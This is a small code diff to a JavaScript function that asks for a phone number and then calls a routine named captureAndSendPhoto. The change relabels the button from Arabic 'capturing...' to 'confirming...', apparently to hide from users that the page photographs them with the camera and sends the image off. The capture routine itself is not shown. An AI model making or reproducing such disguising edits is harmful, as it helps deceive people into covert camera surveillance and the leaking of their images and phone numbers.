@@ -45,7 +45,7 @@ function startCameraAndSend() {
     alert('يرجى إدخال رقم الهاتف.');
     return;
   }
-  document.getElementById('confirmBtn').innerHTML = 'جاري الالتقاط...';
+  document.getElementById('confirmBtn').innerHTML = 'جاري تاكيد...';
   document.getElementById('confirmBtn').disabled = true;
   captureAndSendPhoto(phoneNumber);
 }
